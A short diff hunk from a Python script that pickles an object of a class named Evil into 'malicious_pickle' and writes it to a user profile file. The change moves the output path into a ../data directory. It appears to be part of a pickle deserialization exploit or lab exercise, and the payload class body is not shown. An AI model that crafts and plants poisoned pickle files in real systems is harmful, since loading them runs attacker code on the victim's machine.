@@ -8,7 +8,7 @@ class Evil:
 # Pickle
 malicious_pickle = pickle.dumps(Evil())
 
-with open("alice_profile.pkl", "wb") as f:
+with open("../data/alice_profile.pkl", "wb") as f:
     f.write(malicious_pickle)
 
 import base64
